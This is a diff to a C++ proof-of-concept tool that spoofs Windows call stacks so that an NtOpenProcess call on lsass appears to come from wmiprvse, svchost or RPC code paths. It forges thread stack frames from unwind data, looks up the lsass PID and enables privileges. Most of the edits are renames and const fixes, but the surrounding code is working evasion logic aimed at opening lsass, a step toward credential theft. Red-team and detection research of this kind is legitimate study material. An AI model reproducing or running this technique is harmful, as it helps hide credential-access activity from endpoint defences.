@@ -1,4 +1,3 @@
-#include <algorithm>
 #include <ehdata.h>
 #include <iostream>
 #include <map>
@@ -14,7 +13,7 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
 #define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
 
-#define MAX_STACK_SIZE 10000
+#define MAX_STACK_SIZE 12000
 #define RBP_OP_INFO 0x5
 
 //
@@ -102,6 +101,7 @@ struct StackFrame {
 // offsets may obviously vary on different Windows builds.
 //
 
+// SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
 // CallTrace:
 // C:\Windows\SYSTEM32\ntdll.dll + 9d204
 // C:\Windows\System32\KERNELBASE.dll + 2c13e
@@ -114,9 +114,10 @@ struct StackFrame {
 // C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + c144
 // C:\Windows\System32\KERNEL32.DLL + 17034
 // C:\Windows\SYSTEM32\ntdll.dll + 52651
-std::vector<StackFrame> wmiCallstack =
+// NB Don't include first frame as this will automatically
+// be recorded by the syscall in NtOpenProcess
+std::vector<StackFrame> wmiCallStack =
 {
-    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x9d204, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x2c13e, 0, FALSE),
     StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0xc669, 0, TRUE),
     StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0xc71b, 0, FALSE),
@@ -129,6 +130,7 @@ std::vector<StackFrame> wmiCallstack =
     StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52651, 0, FALSE),
 };
 
+// SourceImage: C:\Windows\system32\svchost.exe
 // CallTrace:
 // C:\Windows\SYSTEM32\ntdll.dll + 9d204
 // C:\Windows\System32\KERNELBASE.dll + 2c13e
@@ -143,9 +145,7 @@ std::vector<StackFrame> wmiCallstack =
 // C:\Windows\System32\sechost.dll + df78
 // C:\Windows\System32\KERNEL32.DLL + 17034
 // C:\Windows\SYSTEM32\ntdll.dll + 52651
-// NB Don't include first frame as this will automatically
-// be recorded by the syscall to NtOpenProcess
-std::vector<StackFrame> svchostCallstack =
+std::vector<StackFrame> svchostCallStack =
 {
     StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x2c13e, 0, FALSE),
     StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x80e5f, 0, TRUE),
@@ -161,6 +161,7 @@ std::vector<StackFrame> svchostCallstack =
     StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52651, 0, FALSE),
 };
 
+// SourceImage: C:\Windows\system32\svchost.exe
 // CallTrace:
 // C:\Windows\SYSTEM32\ntdll.dll + 9d204
 // C:\Windows\System32\KERNELBASE.dll + 32ea6
@@ -181,7 +182,7 @@ std::vector<StackFrame> svchostCallstack =
 // C:\Windows\SYSTEM32\ntdll.dll + 52f26
 // C:\Windows\System32\KERNEL32.DLL + 17034
 // C:\Windows\SYSTEM32\ntdll.dll + 52651
-std::vector<StackFrame> rpcCallstack =
+std::vector<StackFrame> rpcCallStack =
 {
     StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x32ea6, 0, FALSE),
     StackFrame(L"C:\\Windows\\SYSTEM32\\lsm.dll", 0xe959, 0, TRUE),
@@ -207,7 +208,7 @@ std::vector<StackFrame> rpcCallstack =
 // Calculates the image base for the given stack frame
 // and adds it to the image base map.
 //
-NTSTATUS GetImageBase(StackFrame &stackFrame)
+NTSTATUS GetImageBase(const StackFrame &stackFrame)
 {
     NTSTATUS status = STATUS_SUCCESS;
     HMODULE tmpImageBase = 0;
@@ -250,7 +251,7 @@ Cleanup:
 }
 
 //
-// Uses the offset within the stackframe structure to
+// Uses the offset within the StackFrame structure to
 // calculate the return address for fake frame.
 //
 NTSTATUS CalculateReturnAddress(StackFrame &stackFrame)
@@ -278,11 +279,11 @@ Cleanup:
 
 //
 // Calculates the total stack space used by the fake stack frame. Uses
-// a minimal implementation of RtlUnwind to parse the unwind codes for
-// target function and add up total stack size. Largely based on:
+// a minimal implementation of RtlVirtualUnwind to parse the unwind codes
+// for target function and add up total stack size. Largely based on:
 // https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773
 //
-NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, DWORD64 ImageBase, StackFrame &stackFrame)
+NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase, StackFrame &stackFrame)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PUNWIND_INFO pUnwindInfo = NULL;
@@ -299,6 +300,9 @@ NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, DWORD64 
     }
 
     // [1] Loop over unwind info.
+    // NB As this is a PoC, it does not handle every unwind operation, but
+    // rather the minimum set required to successfully mimic the default
+    // call stacks included.
     pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
     while (index < pUnwindInfo->CountOfCodes)
     {
@@ -427,11 +431,11 @@ Cleanup:
 // via loading any required dlls, resolving module addresses
 // and calculating spoofed return addresses.
 //
-NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallstack)
+NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallStack)
 {
     NTSTATUS status = STATUS_SUCCESS;
 
-    for (auto stackFrame = targetCallstack.begin(); stackFrame != targetCallstack.end(); stackFrame++)
+    for (auto stackFrame = targetCallStack.begin(); stackFrame != targetCallStack.end(); stackFrame++)
     {
         // [1] Get image base for current stack frame
         status = GetImageBase(*stackFrame);
@@ -465,7 +469,7 @@ Cleanup:
 //
 // Pushes a value to the stack of a Context structure.
 //
-void PushToStack(CONTEXT &Context, ULONG64 value)
+void PushToStack(CONTEXT &Context, const ULONG64 value)
 {
     Context.Rsp -= 0x8;
     PULONG64 AddressToWrite = (PULONG64)(Context.Rsp);
@@ -477,7 +481,7 @@ void PushToStack(CONTEXT &Context, ULONG64 value)
 // to execute by building a fake call stack via modifying
 // rsp and appropriate stack data.
 //
-void InitialiseFakeThreadState(CONTEXT& context, std::vector<StackFrame> &targetCallstack)
+void InitialiseFakeThreadState(CONTEXT& context, const std::vector<StackFrame> &targetCallStack)
 {
     ULONG64 childSp = 0;
     BOOL bPreviousFrameSetUWOP_SET_FPREG = false;
@@ -511,7 +515,7 @@ void InitialiseFakeThreadState(CONTEXT& context, std::vector<StackFrame> &target
     //      |   RET ADDRESS  |
     //       ----------------   <--- RSP when NtOpenProcess is called
     //
-    for (auto stackFrame = targetCallstack.rbegin(); stackFrame != targetCallstack.rend(); ++stackFrame)
+    for (auto stackFrame = targetCallStack.rbegin(); stackFrame != targetCallStack.rend(); ++stackFrame)
     {
         // [2.1] Check if the last frame set UWOP_SET_FPREG.
         // If the previous frame uses the UWOP_SET_FPREG
@@ -543,9 +547,11 @@ void InitialiseFakeThreadState(CONTEXT& context, std::vector<StackFrame> &target
             auto tmpStackSizeCounter = 0;
             for (ULONG i = 0; i < diff; i++)
             {
+                // e.g. push rbx
                 PushToStack(context, 0x0);
                 tmpStackSizeCounter += 0x8;
             }
+            // push rbp
             PushToStack(context, childSp);
 
             // [2.3] Minus off the remaining function stack size
@@ -556,7 +562,7 @@ void InitialiseFakeThreadState(CONTEXT& context, std::vector<StackFrame> &target
 
             // [2.4] From my testing it seems you only need to get rbp
             // right for the next available frame in the chain which pushes it.
-            // Hence, there can be a frame in between which does not modify rbp.
+            // Hence, there can be a frame in between which does not push rbp.
             // Ergo set this to false once you have resolved rbp for frame
             // which needed it. This is pretty flimsy though so this assumption
             // may break for other more complicated examples.
@@ -590,8 +596,6 @@ NTSTATUS GetLsassPid(DWORD &pid)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
-    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
-    std::vector<DWORD> threadIds;
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
     if (INVALID_HANDLE_VALUE == snapshot)
@@ -619,8 +623,8 @@ Cleanup:
 // https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
 //
 BOOL SetPrivilege(
-    LPCTSTR lpszPrivilege,
-    BOOL bEnablePrivilege
+    const LPCTSTR lpszPrivilege,
+    const BOOL bEnablePrivilege
 )
 {
     TOKEN_PRIVILEGES tp = {};
@@ -705,7 +709,7 @@ DWORD DummyFunction(LPVOID lpParam)
     return 0;
 }
 
-NTSTATUS HandleArgs(int argc, char* argv[], std::vector<StackFrame> &targetCallstack)
+NTSTATUS HandleArgs(int argc, char* argv[], std::vector<StackFrame> &targetCallStack)
 {
 
     NTSTATUS status = STATUS_SUCCESS;
@@ -714,7 +718,7 @@ NTSTATUS HandleArgs(int argc, char* argv[], std::vector<StackFrame> &targetCalls
     {
         // No argument provided so just default to
         // spoofing svchost call stack.
-        targetCallstack = svchostCallstack;
+        targetCallStack = svchostCallStack;
     }
     else
     {
@@ -722,17 +726,17 @@ NTSTATUS HandleArgs(int argc, char* argv[], std::vector<StackFrame> &targetCalls
         if (callstackArg == "--wmi")
         {
             std::cout << "[+] Target call stack profile to spoof is wmi\n";
-            targetCallstack = wmiCallstack;
+            targetCallStack = wmiCallStack;
         }
         else if (callstackArg == "--rpc")
         {
             std::cout << "[+] Target call stack profile to spoof is rpc\n";
-            targetCallstack = rpcCallstack;
+            targetCallStack = rpcCallStack;
         }
         else if (callstackArg == "--svchost")
         {
             std::cout << "[+] Target call stack profile to spoof is svchost\n";
-            targetCallstack = svchostCallstack;
+            targetCallStack = svchostCallStack;
         }
         else
         {
@@ -761,12 +765,13 @@ int main(int argc, char* argv[])
     )" << '\n';
 
     NTSTATUS status = STATUS_SUCCESS;
-    std::vector<StackFrame> targetCallstack = {};
+    std::vector<StackFrame> targetCallStack = {};
     DWORD dwThreadId = 0;
     HANDLE hThread = 0;
     CONTEXT context = {};
     PVOID pHandler = NULL;
     BOOL ret = false;
+    DWORD suspendCount = 0;
 
     // Args for NtOpenProcess.
     OBJECT_ATTRIBUTES objectAttr;
@@ -775,7 +780,7 @@ int main(int argc, char* argv[])
     HANDLE hLsass = 0;
 
     // [0] Handle command line args
-    status = HandleArgs(argc, argv, targetCallstack);
+    status = HandleArgs(argc, argv, targetCallStack);
     if (!NT_SUCCESS(status))
     {
         return -1;
@@ -783,9 +788,9 @@ int main(int argc, char* argv[])
 
     // [1] Initialise our target call stack to spoof. This
     // will load any required dlls, calculate ret addresses,
-    // and individual stack sizes needed to spoof the call stack
+    // and individual stack sizes needed to mimic the call stack
     std::cout << "[+] Initialising fake call stack...\n";
-    status = InitialiseSpoofedCallstack(targetCallstack);
+    status = InitialiseSpoofedCallstack(targetCallStack);
     if (!NT_SUCCESS(status))
     {
         std::cout << "[-] Failed to initialise fake call stack\n";
@@ -828,7 +833,7 @@ int main(int argc, char* argv[])
 
     // [5.1] Initialise fake thread state
     std::cout << "[+] Initialising spoofed thread state...\n";
-    InitialiseFakeThreadState(context, targetCallstack);
+    InitialiseFakeThreadState(context, targetCallStack);
 
     // [5.2] Set arguments for NtOpenProcess
     // RCX
@@ -867,7 +872,12 @@ int main(int argc, char* argv[])
 
     // [7] Rock and or roll
     std::cout << "[+] Resuming suspended thread...\n";
-    auto blah = ResumeThread(hThread);
+    suspendCount = ResumeThread(hThread);
+    if (-1 == suspendCount)
+    {
+        std::cout << "[-] Failed to resume thread\n";
+        return -1;
+    }
 
     // [8] Sleep briefly
     std::cout << "[+] Sleeping for 5 seconds...\n";
